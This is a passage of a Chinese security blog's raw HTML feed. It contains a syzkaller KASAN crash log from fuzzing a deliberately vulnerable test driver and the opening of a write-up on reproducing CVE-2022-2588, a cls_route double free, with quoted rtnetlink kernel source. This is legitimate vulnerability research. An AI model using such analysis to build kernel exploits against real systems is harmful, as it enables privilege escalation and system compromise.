a565f7abfba7fd318e72530b1cf04d74b42e64627c6936587c81d9bae45fc0cc2815674946427529151641aba2284c17c8ca26d7b8e0cf45ccb12db3705693a9eeb5b92d84830aae5aa170e6317544681b24a8fcb01ff769d3e89f65e9b205540239d43b81a6c2679810a3467ff0bef5bce56bcb853b60744315fc0f2899e6db88edd5ff2c8d11bd0ea553b3b1766f2ba0ac02e46805a89cfb8f71d743666556f530b759528877b8b71aa6f882616c8a795ef295961007c07479673af54818ccc79b5e43e2bbdcf00ff3d9cbfe679c6e7fc688dd0797c0a7a7e22cbdad3f1f3e3e99f8ed3b17b7f04de17e5817d48abb90203163317ee630fae9bbbe06887208ce9138b0ce0bb8ce511229698c71351c8cbdef2dcf0279c4b334c55254babf6bf4b00a7a2e89557550f338ab5e332824fbf4f1f774b970248916bdd4922fe69c825d62950c6b6a98f49795ef6fbacfc65fd8e879bad0e2963f46be54ae3c699339384cbde926d360501a6a0f0f21090d8f735301c04230d969ec4e88f1e18fc62e656ac03610dc1772295df75ca08fbd4e1fd7f39eb2cb349878a4936d35f335d1eac7da574276a6d43672393a747dd7182c27100370667700f3de9b0389cf8ac812f5ad07c7517a2a64ca22b17f120011e2a70d95cb8f7835f7cc0481defaf20665a0418e1385d0306ee26c5a861ef69e37ccb91237c9c106e9b483ae4e1c3957e02f1f5b247c835dff73502bf518d1c80e827c7d6221f1c8ca9226d2a1ef904f5025504544f4024c60ff5bf23f5b79cee9720745bf36a86179d7d0af1758e663bcd6e98d2f9339dc9ecc038a1521bb16edfbb9071fb09c2917a2144c90cd752b5683e321b70271089252da45fbb01ec19e9bc9261f7f50e129d44f6ecfed3222f7bc9943356b46f0aa97f1b03ef95890543c22a00655a8c99fdccd4ef04a7d72084d5c77a96025d5095ed608b19d0f5a7ae778fa4eab4a8f739b5ceb3fc97f11ec67a9b6c6d7ff88a4395e8bc27e8b7034de7be8683c958f2773f2bb985a9bede7e1d39aa7899e1e88aa7d7af00a9a9f084a094636af8160a14626d2c0dc142656911e418aef80dcace137e41ad996984975c62f63e5f0fdc53a699944c2e06d275264375a5330e4a295918e6f0f6e57d82e2de705eb9ce5791eac9a117d9912c6d6ae1ffdb08389dfd1eea539d2e9069520076873608d22975dd38bfd1df04c4f9dcac4bfed02af53802f8582ac59321a8453e69a7cb5a5cee4a6940466a5cecb19c9527c94d0441ad4328297f3e92714ee3153b459f45cad7e2a2197da7bb5f3ea498e0b9e49405e8f4c881eb6a9555b82072d5a3fa06b935d0c127244d747a637d09fceaffc64f983aa7df54d59f265ed28ebe79f41ebd72c2a401b88adf0daf4158bc47faebfec1fcf934b55a9bac5da808566db2216c21c17b26e25dc8566e3a14bbddd83b8d2db809a5098f5404e67958fa801f073ba48e5c0b4a5a1a98df77d8d81dd1054c7e8ece8ac44d4c21435e830c7d28927b1a61670886116d4f819bd406dd61c0bc7e57933b9071cd1de7fe9e5e8bfb66c3e637f3dc27329c936b47c2ce5f7bd8d96e889c9a4cfe6ffcfcc1b2de5b1b6cc417952d07413fbaa586bc997db9dc916a529d6e6ef7d358f41d35f888825f6491bea834adb7d57a6fdfe7b61e6ed369329b009404352f168b1adf1683fa8c860e272dcdc5593e100d83fa4bf2fcb4832bd6da307c3910675e36f5df01e1e90253948f17a6b286f50afff315e562d8feb83c8dd68397319022dfd951be06d494e9bba6dc0ddc8c8b20821522ae68bb02b749925c94f7d80566cdfdef0f6076cf7542ec7c064d0a9e1a7f71d5b67a88a94ad19d4a73e3f16d68709e0e5ca166d37c8baa384434732bba3e7d08fba66f012d22e21077a23001f1f0160f4efee36be51edb83910cd2e7362fdc173d5699b634e75489a16580c733ffce3df11d5f482c7ff82cd8c843c0d513404758016955862d308c1e0e36ad3d98652cf837782423451c4e8638990fb65eff25c380caed61a0a8fbd1cc484ecc70467efc17310cef1fd3c075d339f40067b71b15541571be112f85f89afc6fc842b263e3ce57116176402a76e695fd28eacc2da85ee62aafa6bcb896d554f843ee152e6b84b8a3c6aaeea7443b5290cec768ba0ba2aada7dee7438b76861d2434104fac6a86f7448981ab970d27c5268d3d7eac9ff26b657affacbd0dbdc30ecfd0e305fba89461c1d85aef2feb30f0cb9c94a46578d55957984deed9ec02f796246c366adc7cb32eeae18f2d56a86702c04c1dd172a70899d28808d2050d7cdaf78c6975c5dd56ab3435fc40b8019a6bbd8964bc212abb6ab3e82e12604650433964cb48093e46fe79439022f6b862ed96c6bfa59f834a28ae857df0805b6e7b4ed5db1bee79ed3999485131468ebaa043304ce67f01a6b67ac7e0d744326e0c21a857620b0e999534e36c72855a1f674ec301dc06fc1640ee4af225a3f8a1a6ed344bff7b377e957eb6a606c4fb4d82ba4238d3eedeb4ec74ee2dc7341edab9dedfcb49828b901abac4991f5886f663d8d07e77b2b8b4b12c896f28149ca896eb2d9dcb2f18a5ad6c7918e57d0e730d012f39328a94172a9f41946348ed5eed60b87512aec77114c4582ab7a29f0a19e84e52c11b07f14d53b3310cadac1546e0b042243e6afb376192ecd87be7b574f852f411ff5a8a6f7fdb743b568e89a34ba3547b2959f3760e382b75441bea3713c81e31391b10751f80bdb42216d7644d8ab5aedb5ed437e0e7954a1ef4bd6c3cc2aa45b652c86281345eaa3dbaceb684224222db02c9a638475364135284a21097286ef864706c9df5c350dc5933a5ba1d46795f49316705d7ae7cb59f5e91994a6c57ae525189243cd36b8ab1c351eaaa04ace3bccfb1287c4c60667524562b8f350da09e6ca212194d49e6550b2289170c64e8c9d019b4d4f7d888e62b5458c5b28b2eda131079f5e66d35014d5460e7e785bcc7ffc6141384498c55dad57901729fc056a5595850ceb1d5c6d31a6894b8d8b85f9173f9ebc158d2d43952c48d4f3590a4e4fae41ea0aa9c8ab78557fd4e9ca5611b62ca6f0b5f6c46592537f008cd5083b08bc3fd1218773cb10fa44933fbaeed4afa57afae135c8a1898b06a5c2855e3f8a6bfe8ba9a589bceb5f9a5376f220cfdfc977e7416abd7258b40e9df634d966d7d8e665ab3ab6495bd07dcdf32ac3f62eaaf2e18ba093f46c96b7ac2e6fca971dfec82c72fd7241aac6774655ad19b8bebd1766e1afa44510682369083ae89734a7809539193d48146fe83f2401b3a33a0857f8cd2a305bc59e58bf41360fe0abe63a6f99bd12a8d1988a3c52dc3ac7091c71ffbab698284079799bbd66370b473b542dab968670fb8b4444af52b5070601df1702738cb29aceae70c6b916d11bdfc6814d5f57a6b257f62587f4e35525074fc031db80f98b9b59130d831bd8bbaa45ed2544dcb34badeac02b794c19875e3edb4b4b78156995df60b4f03a03a9eae88bc5bc071d0f948f38f9a92511b5939acc135820d10c708edb737c9ad7c7dd80cb9cba5347a712e946409bd400c7bb5badc9ecf969ca886260e184ebcb5826b6de23bd0e0a3935321299d45d0e151c782cde6239490566f11b91bac99fd0d202f20abd4c8fad629c4596b857730ac92cc6e67e3177692dd27f1eaa48ca6d19649d0692bd6ab77772c04535c91660f961222ae3a2fbb2663f4fb737f153595ce9a8b865c2dd36eb19b459e933322ddef02a2412e8dbd3b48e951eb9497f3837a6a3b567c43edb3c4f74bf5356187c591f4419dbc21cec3eb31ed865a6146cb455b6a381f0663f8a09c16eda030839fce28a85faa27a0adbb504cc20e3a1af0c6b29f8a7a8b9cbf2e16cfc4ae9413338a6fe08e30f9c495869828203e774cff77da575ec0399368c5568a5d98e51047ece46b2612fe5ab2613761b58d6dcbd079c7d253db81a540f2b921bd0599b70c3119803fc5e97954feaf4a7f813d77a03a811d2582f14989fca781dc28aa96958b9546cc83fa543bc00928a602f3f4be13ec7f1acb78d57e6ebd599e2a077656ffaf04d9a971a017f2391301fdcd7053925d41f9d355dc229ac94fcc0f0b01070b3cb485cbae3356a5421ff428067e9be643933615b0d3bcbe3a2a6d25&quot;</span>, <span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>上面是截取的log文件，其中会记录系统调用，调用的参数等一系列信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">==================================================================</span><br><span class="line">BUG: KASAN: slab-out-of-bounds <span class="keyword">in</span> instrument_copy_from_user include/linux/instrumented.h:135 [inline]</span><br><span class="line">BUG: KASAN: slab-out-of-bounds <span class="keyword">in</span> _copy_from_user+0x66/0xd0 lib/usercopy.c:15</span><br><span class="line">Write of size 4096 at addr ffff88810686f800 by task syz-executor/3452</span><br><span class="line">CPU: 0 PID: 3452 Comm: syz-executor Not tainted 5.11.0 <span class="comment">#1</span></span><br><span class="line">Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014</span><br><span class="line">Call Trace:</span><br><span class="line"> __dump_stack lib/dump_stack.c:79 [inline]</span><br><span class="line"> dump_stack+0x9c/0xcf lib/dump_stack.c:120</span><br><span class="line"> print_address_description.constprop.0+0x1a/0x140 mm/kasan/report.c:230</span><br><span class="line"> __kasan_report mm/kasan/report.c:396 [inline]</span><br><span class="line"> kasan_report.cold+0x7f/0x10e mm/kasan/report.c:413</span><br><span class="line"> check_memory_region_inline mm/kasan/generic.c:179 [inline]</span><br><span class="line"> check_memory_region+0x17c/0x1e0 mm/kasan/generic.c:185</span><br><span class="line"> instrument_copy_from_user include/linux/instrumented.h:135 [inline]</span><br><span class="line"> _copy_from_user+0x66/0xd0 lib/usercopy.c:15</span><br><span class="line"> test_write+0x4f/0x70 [vuln_device]</span><br><span class="line"> vfs_write+0x1bf/0x760 fs/read_write.c:603</span><br><span class="line"> ksys_write+0x100/0x210 fs/read_write.c:658</span><br><span class="line"> do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">RIP: 0033:0x7f1a044ec96d</span><br><span class="line">Code: c3 e8 17 32 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</span><br><span class="line">RSP: 002b:00007f1a0325bbf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001</span><br><span class="line">RAX: ffffffffffffffda RBX: 00007f1a04628f80 RCX: 00007f1a044ec96d</span><br><span class="line">RDX: 000000000000003f RSI: 0000000020001580 RDI: 0000000000000004</span><br><span class="line">RBP: 00007f1a0454a4af R08: 0000000000000000 R09: 0000000000000000</span><br><span class="line">R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000</span><br><span class="line">R13: 00007fff371812bf R14: 00007fff37181460 R15: 00007f1a0325bd80</span><br><span class="line">Allocated by task 3452:</span><br><span class="line"> kasan_save_stack+0x1b/0x40 mm/kasan/common.c:38</span><br><span class="line"> kasan_set_track mm/kasan/common.c:46 [inline]</span><br><span class="line"> set_alloc_info mm/kasan/common.c:401 [inline]</span><br><span class="line"> ____kasan_kmalloc.constprop.0+0x84/0xa0 mm/kasan/common.c:429</span><br><span class="line"> test_write+0x3f/0x70 [vuln_device]</span><br><span class="line"> vfs_write+0x1bf/0x760 fs/read_write.c:603</span><br><span class="line"> ksys_write+0x100/0x210 fs/read_write.c:658</span><br><span class="line"> do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">The buggy address belongs to the object at ffff88810686f800</span><br><span class="line">The buggy address is located 0 bytes inside of</span><br><span class="line">The buggy address belongs to the page:</span><br><span class="line">page:00000000a4947c90 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10686e</span><br><span class="line">head:00000000a4947c90 order:1 compound_mapcount:0</span><br><span class="line">flags: 0x200000000010200(slab|head)</span><br><span class="line">raw: 0200000000010200 ffffea0004335180 0000000300000003 ffff888100041280</span><br><span class="line">raw: 0000000000000000 0000000080080008 00000001ffffffff 0000000000000000</span><br><span class="line">page dumped because: kasan: bad access detected</span><br><span class="line">Memory state around the buggy address:</span><br><span class="line"> ffff88810686f900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line"> ffff88810686f980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">&gt;ffff88810686fa00: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line">                   ^</span><br><span class="line"> ffff88810686fa80: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line"> ffff88810686fb00: <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span> <span class="built_in">fc</span></span><br><span class="line">==================================================================</span><br></pre></td></tr></table></figure><p>这里就是<code>report</code>给出的是<code>kernel</code>相关的信息，比如函数调用栈，以及寄存器信息等。</p><p>至于这里为什么无法重现出我觉得一大原因就是我没对这个驱动载入设置自启动，导致一次<code>kernel panic</code>之后没有重新加载驱动（<del>下班了不搞了！</del>）。其实有kernel pwn基础的朋友读懂前面的log和<code>kernel panic</code>的信息都会特别轻松的，这里不详细说了！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章在前面已经是埋了许多坑了，靠后的几篇文章都提到了我想学&lt;code&gt;syzkaller&lt;/code&gt;，但是总有事耽搁以至于拖到了现在。</summary>
      
    
    
    
    <category term="fuzzing" scheme="https://196082.github.io/categories/fuzzing/"/>
    
    
    <category term="fuzzing" scheme="https://196082.github.io/tags/fuzzing/"/>
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
    <category term="syzkaller" scheme="https://196082.github.io/tags/syzkaller/"/>
    
    <category term="syzlang" scheme="https://196082.github.io/tags/syzlang/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-2588复现</title>
    <link href="https://196082.github.io/2023/10/27/CVE-2022-2588/"/>
    <id>https://196082.github.io/2023/10/27/CVE-2022-2588/</id>
    <published>2023-10-27T08:39:53.000Z</published>
    <updated>2023-11-29T10:11:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来不想分析CVE了，无奈前面提到了内核内部隔离机制，而在往期的文章中只在<a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes！<i class="fas fa-external-link-alt"></i></a> 文章中简要提到过通过实现页级的UAF来实现绕过的，可是还存在一种技术可以绕过，如果不记录下来是真的心痒，所以只能把<code>syzkaller</code>的学习计划往后推推进而来分析这一个利用方法。文件创建时间是10月19号，<del>不想写文章了，懒狗症犯了</del></p><p>回到正题，这一漏洞出现在流量控制子系统包分类器的<code>cls_route</code>过滤器中，当旧过滤器的句柄为0时，在释放之前内核不会从哈希表中将其删除从而产生的Double Free。</p><h2 id="Rtnetlink简述"><a href="#Rtnetlink简述" class="headerlink" title="Rtnetlink简述"></a>Rtnetlink简述</h2><p><del>这里直接抄我参考文章的原文，绝对不是我懒得写</del></p><p>Rtnetlink是所有内核网络子系统使用的网络连接总线，包括网络接口、路由、fdb和邻居。一些内核网络子系统也在通用netlink总线上提供服务。Linux内核网络子系统使用消息类型和系列向Rtnetlink内核注册处理程序。Rtnetlink允许读取和更改内核的路由表。它在内核中用于在各种子系统之间进行通信，也用于与用户空间程序进行通信。网络路由、IP地址、链接参数、邻居设置、排队规则、流量类别和数据包分类器都可以通过NETLINK_ROUTE套接字进行控制。Rtnetlink由以下消息类型组成（除了标准的netlink消息）：</p><ul><li>RTM_NEWLINK、RTM_DELLINK、RTM_GETLINK创建、删除或获取有关特定网络接口的信息。</li><li>RTM_NEWADDR、RTM_DELADDR、RTM_GETADDR添加、删除或接收有关与接口关联的IP地址的信息。</li><li>RTM_NEWROUTE、RTM_DELROUTE、RTM_GETROUTE创建、删除或接收有关网络路由的信息。</li><li>RTM_NEWNEIGH、RTM_DELNEIGH、RTM_GETNEIGH添加、删除或接收有关邻居表条目的信息（例如，ARP条目）。</li><li>RTM_NEWRULE、RTM_DELRULE、RTM_GETRULE添加、删除或检索路由规则。</li><li>RTM_NEWQDISC、RTM_DELQDISC、RTM_GETQDISC添加、删除或获取排队规则。</li><li>RTM_NEWTCLASS、RTM_DELTCLASS、RTM_GETTCLASS添加、删除或获取流量类别。</li><li>RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER添加、删除或接收有关流量过滤器的信息。</li></ul><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>首先，当内核启动加载时会初始化<code>netlink</code>协议，此时会通过调用<code>rtnetlink_init</code>函数初始化路由<code>netlink socket</code>接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,</span><br><span class="line">      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_BULK_DEL_SUPPORTED);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由上面的代码可以看出来的，主要是通过<code>rtnl_register</code>函数将不同的消息类型和对应的操作进行了绑定，这里简单看一下这个函数定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">     flags);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这个函数其实就是<code>rtnl_register_internal</code>套了一层壳，这里主要关注<code>rtnl_register</code>的参数定义。前面就是协议，消息类型。紧随的这两个分别是两个毁掉函数被传入，而这两个毁掉函数对应的是两种类型，第一种是动作函数，第二种是dump函数dumpit，而从上面的初始化函数来看是有的消息只存在第一个有的只有第二个，还有的两者都有。从前面的简述中看到其实有的消息类型是没被初始化的比如<code>RTM_NEWTFILTER</code>，添加一个流量过滤器，其是在<code>tc_filter_init</code>函数中被初始化的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">destroy_workqueue(tc_filter_wq);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当用户通过<code>NETLINK_ROUTE</code>套接字发送<code>RTM_NEWTFILTER</code>消息用于创建一个流量过滤器时，内核会调用<code>rtnetlink_rcv_msg</code>函数来处理<code>rtnetlink</code>消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 